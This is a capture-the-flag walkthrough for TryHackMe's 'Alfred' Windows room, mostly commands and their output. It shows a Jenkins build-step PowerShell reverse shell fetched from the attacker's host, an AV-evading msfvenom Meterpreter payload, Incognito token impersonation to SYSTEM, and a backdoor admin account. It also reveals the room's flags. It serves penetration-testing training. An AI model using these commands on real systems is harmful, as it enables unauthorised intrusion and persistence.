# Alfred — TryHackMe Walkthrough

> Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.

<p align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/953f1e4a27c7e04130b824ec1bc8e159.png" />
</p>

<p align="center">
  <a href="https://tryhackme.com/room/alfred">
    <img src="https://img.shields.io/badge/TryHackMe-Alfred-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Windows-blue">
  <img src="https://img.shields.io/badge/Focus-Jenkins%20%7C%20Token%20Impersonation%20%7C%20PrivEsc-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Jenkins Default Credential Exploitation |
| 3 | PowerShell Reverse Shell via Nishang |
| 4 | Meterpreter Shell Generation with msfvenom |
| 5 | Abusing Token Privileges for Local Privilege Escalation |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Perform a port scan against a Windows machine that blocks ICMP
- Identify and exploit a Jenkins instance using default credentials
- Deliver a PowerShell reverse shell using the Nishang framework
- Generate a Meterpreter payload with msfvenom and upgrade your shell
- Understand Windows access tokens and how they are used for privilege escalation
- Impersonate a SYSTEM-level token using the Incognito tool
- Migrate into a privileged process to gain full SYSTEM access

---

## Prerequisites

- Basic familiarity with Windows command line and PowerShell
- Metasploit, msfvenom, and Netcat installed
- Nishang `Invoke-PowerShellTcp.ps1` downloaded from [GitHub](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
- The target does not respond to ping — always use `-Pn` with Nmap on this machine

---

## Task 1 — Initial Access

---

### Question 1 — How many ports are open?

**Approach:** Run an aggressive Nmap scan using `-Pn` to skip the ping check since ICMP is disabled on this Windows machine. Scan for version info, default scripts, and OS detection.

```
kali@kali:~/CTFs/tryhackme/Alfred$ sudo nmap -A -sS -sC -sV -O -Pn Machine_IP
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-18 21:16 CET
Nmap scan report for Machine_IP
Host is up (0.053s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  tcpwrapped
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2020-10-02T14:42:05
|_Not valid after:  2021-04-03T14:42:05
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   40.28 ms 10.8.0.1
2   55.56 ms Machine_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1254.35 seconds
```

> **Note:** Three ports are open — port **80** (IIS web server), port **3389** (RDP), and port **8080** (Jetty HTTP server). Port 8080 running Jetty is a strong indicator of a **Jenkins** installation. Jenkins is a widely used CI/CD automation server that is frequently misconfigured in enterprise environments.

<details>
<summary>Reveal Answer</summary>

**`3`**

</details>

---

### Question 2 — What is the username and password for the login panel?

**Approach:** Navigate to `http://Machine_IP:8080` in your browser to reach the Jenkins login panel. Try the most common default credentials.

<p align="center">
  <img src="https://i.ibb.co/XrK6VM5d/2020-11-18-21-38.png" alt="Jenkins Login Panel" />
</p>

> **Note:** Jenkins ships with a default admin account that is frequently left unchanged. The credentials **`admin:admin`** grant full administrative access, including the ability to run arbitrary commands on the underlying system through build job configuration.

<details>
<summary>Reveal Answer</summary>

**`admin:admin`**

</details>

---

### Question 3 — Execute a reverse shell via Jenkins

**Approach:** Once logged in, navigate to the existing project at `http://Machine_IP:8080/job/project/configure`. Scroll to the **Build** section and add a build step to execute a Windows batch command. Insert the PowerShell reverse shell payload below.

Before triggering the build, place `Invoke-PowerShellTcp.ps1` in a directory and serve it over HTTP using Python:

```
python3 -m http.server 80
```

Then set the following as the build command in Jenkins:

```ps1
powershell iex (New-Object Net.WebClient).DownloadString('http://YOUR_IP/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress YOUR_IP -Port 9001
```

<p align="center">
  <img src="https://i.ibb.co/nN2G6kNV/2020-11-18-21-41.png" alt="Jenkins Build Configuration" />
</p>

<p align="center">
  <img src="https://i.ibb.co/GvqSVrHM/2020-11-18-21-45.png" alt="Jenkins Build Triggered" />
</p>

<p align="center">
  <img src="https://i.ibb.co/VcJjjwxH/2020-11-18-21-46.png" alt="Jenkins Build Output" />
</p>

> **Note:** The Jenkins **Build > Execute Windows batch command** step runs commands directly on the host operating system with the privileges of whatever user is running the Jenkins service. This is a classic abuse of legitimate CI/CD functionality — it is not a code vulnerability but a misconfiguration, making it common in real-world environments.

---

### Question 4 — What is the user.txt flag?

**Approach:** Start a Netcat listener before triggering the Jenkins build. Once the reverse shell connects, navigate to the user's Desktop and read the flag.

```
kali@kali:~/CTFs/tryhackme/Alfred$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on Machine_IP 49224
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>whoami
alfred\bruce
PS C:\Program Files (x86)\Jenkins\workspace\project> cd "C:\Users\bruce\Desktop"
PS C:\Users\bruce\Desktop> dir


    Directory: C:\Users\bruce\Desktop


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---        10/25/2019  11:22 PM         32 user.txt


PS C:\Users\bruce\Desktop> type user.txt
79007a09481963edf2e1321abd9ae2a0
```

> **Note:** The shell connects as user **`alfred\bruce`** — the account running the Jenkins service. This confirms that Jenkins was running without proper service account isolation. The user flag is found directly on Bruce's Desktop.

<details>
<summary>Reveal Answer</summary>

**`79007a09481963edf2e1321abd9ae2a0`**

</details>

---

## Task 2 — Switching Shells

**Approach:** To make privilege escalation easier, upgrade from the PowerShell reverse shell to a Meterpreter shell. Use `msfvenom` to generate a Windows reverse TCP payload, serve it over HTTP, download it on the target, and catch it in Metasploit.

### Step 1 — Generate the Meterpreter payload

```
kali@kali:~/CTFs/tryhackme/Alfred$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=YOUR_IP LPORT=9002 -f exe -o win_revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: win_revshell.exe
```

> **Note:** The `shikata_ga_nai` encoder is used to obfuscate the payload, which helps avoid detection by basic antivirus products. The resulting `.exe` is a standalone binary that, when executed on the target, calls back to your Metasploit listener.

### Step 2 — Download and run the payload on the target

Serve the file with Python from the same directory as `win_revshell.exe`:

```
python3 -m http.server 8000
```

In the existing PowerShell shell on the target, download and execute the payload:

```ps1
powershell "(New-Object System.Net.WebClient).Downloadfile('http://YOUR_IP:8000/win_revshell.exe','win_revshell.exe')"
Start-Process "win_revshell.exe"
```

### Step 3 — Set up the Metasploit handler

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 9002
run
```

> **Note:** The Metasploit multi/handler must be running before you execute the payload on the target. Once the executable runs, a Meterpreter session will open in Metasploit.

### Question — What is the final size of the exe payload?

<details>
<summary>Reveal Answer</summary>

**`73802`**

</details>

---

## Task 3 — Privilege Escalation

Windows uses **access tokens** to control what actions a process or user is permitted to perform. When a user logs in, LSASS assigns them a token containing their user SID, group SIDs, and privileges. There are two key token types:

- **Primary tokens** — assigned to a user account at login
- **Impersonation tokens** — allow a process to temporarily act as another user

The most commonly abused privileges for privilege escalation include:

| Privilege | Description |
|-----------|-------------|
| `SeImpersonatePrivilege` | Impersonate a client after authentication |
| `SeAssignPrimaryPrivilege` | Assign a primary token to a process |
| `SeDebugPrivilege` | Debug and inject into other processes |
| `SeTakeOwnershipPrivilege` | Take ownership of files or objects |
| `SeBackupPrivilege` | Read any file regardless of permissions |

---

### Step 1 — Check current privileges

**Approach:** From the Meterpreter session, drop into a shell and run `whoami /priv` to list all enabled and disabled token privileges.

```
PS C:\Users\bruce\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

> **Note:** Two key privileges are **Enabled** — `SeDebugPrivilege` and `SeImpersonatePrivilege`. These allow us to impersonate other user tokens on the system, including the `NT AUTHORITY\SYSTEM` token. This is the foundation of the token impersonation attack we will use.

---

### Step 2 — Load Incognito and impersonate SYSTEM

**Approach:** In Meterpreter, load the `incognito` module to manage and impersonate tokens. List available tokens and impersonate the `BUILTIN\Administrators` token.

```
meterpreter > load incognito
meterpreter > list_tokens -g
meterpreter > impersonate_token "BUILTIN\Administrators"
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> **Note:** Even after impersonating the SYSTEM token, the **actual process permissions** are still determined by the **primary token** of the process — not the impersonation token. This means file access may still be restricted. To get true SYSTEM-level permissions, we must **migrate** into a process that is already running as SYSTEM.

### Question — What is the output of getuid after impersonation?

<details>
<summary>Reveal Answer</summary>

**`NT AUTHORITY\SYSTEM`**

</details>

---

### Step 3 — Migrate to a SYSTEM process and read root.txt

**Approach:** Use `ps` in Meterpreter to list running processes. Find `services.exe` (owned by `NT AUTHORITY\SYSTEM`) and migrate into it using its PID. Then read the root flag.

> **Note:** `services.exe` is one of the safest migration targets — it is stable, always running, and owned by SYSTEM. After migrating, all commands will execute with full SYSTEM privileges.

The root flag is located at `C:\Windows\System32\config\root.txt`. The walkthrough also demonstrates using Incognito's standalone binary to create a new administrator user directly from the PowerShell shell:

```
kali@kali:~/CTFs/tryhackme/Alfred$ sudo smbserver.py smbfolder .
Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Incoming connection (Machine_IP,49259)
[*] AUTHENTICATE_MESSAGE (alfred\bruce,ALFRED)
[*] User ALFRED\bruce authenticated successfully
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:SMBFOLDER)
[*] Closing down connection (Machine_IP,49259)
```

```
kali@kali:~/CTFs/tryhackme/Alfred$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on Machine_IP 49257
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>cd C:\windows\temp
PS C:\windows\temp> copy \\YOUR_IP\smbfolder\incognito2\incognito.exe
PS C:\windows\temp> ./incognito.exe add_user stroke hello123!
[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
[*] Enumerating tokens
[*] Attempting to add user stroke to host 127.0.0.1
[+] Successfully added user
PS C:\windows\temp> ./incognito.exe add_localgroup_user Administrators stroke
[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
[*] Enumerating tokens
[*] Attempting to add user stroke to local group Administrators on host 127.0.0.1
[+] Successfully added user to local group
```

<p align="center">
  <img src="https://i.ibb.co/3m9GZcrf/2020-11-18-22-19.png" alt="Root flag" />
</p>

> **Note:** Incognito can also be used as a standalone binary (not just a Metasploit module). It is transferred to the target via an SMB share hosted with Impacket's `smbserver.py`. The `add_user` and `add_localgroup_user` commands create a new local administrator account — a persistence technique commonly used after gaining SYSTEM access.

### Question — What is the root.txt flag?

<details>
<summary>Reveal Answer</summary>

**`dff0f748678f280250f25a45b8046b4a`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan with `-Pn` | Found IIS on port 80, RDP on 3389, Jenkins on 8080 |
| 2 | Jenkins login with `admin:admin` | Gained full admin access to Jenkins dashboard |
| 3 | Build step command injection | Delivered Nishang PowerShell reverse shell as `bruce` |
| 4 | Read `user.txt` | Found user flag on Bruce's Desktop |
| 5 | msfvenom payload + Metasploit handler | Upgraded to Meterpreter shell |
| 6 | `whoami /priv` | Confirmed `SeImpersonatePrivilege` and `SeDebugPrivilege` enabled |
| 7 | Incognito token impersonation | Impersonated `BUILTIN\Administrators` token → `NT AUTHORITY\SYSTEM` |
| 8 | Migrated to `services.exe` | Gained full SYSTEM-level process permissions |
| 9 | Read `root.txt` | Found root flag at `C:\Windows\System32\config\root.txt` |
